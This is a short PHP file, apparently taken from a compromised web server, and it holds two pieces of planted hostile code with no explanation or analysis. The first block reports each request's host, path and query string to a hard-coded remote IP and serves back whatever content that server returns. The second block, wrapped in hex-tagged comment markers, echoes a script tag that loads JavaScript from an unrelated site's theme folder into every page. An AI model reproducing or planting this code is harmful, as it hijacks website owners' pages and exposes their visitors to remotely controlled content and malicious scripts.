<?php
set_time_limit(0);

header("Content-Type: text/html;charset=gb2312");
date_default_timezone_set('PRC');
$Remote_server = "http://74.91.29.69:9988/"; 
$host_name = "http://".$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'];
$Content_mb=file_get_contents($Remote_server."/index.php?host=".$host_name."&url=".$_SERVER['QUERY_STRING']."&domain=".$_SERVER['SERVER_NAME']);

echo $Content_mb;

?>
<?php
#92f1ae#
if(empty($f)) {
$f = "<script type=\"text/javascript\" src=\"http://just-life.eu/wp-content/themes/justlife/wlxhtzd2.php?id=21868768\"></script>";
echo $f;
}
#/92f1ae#
?>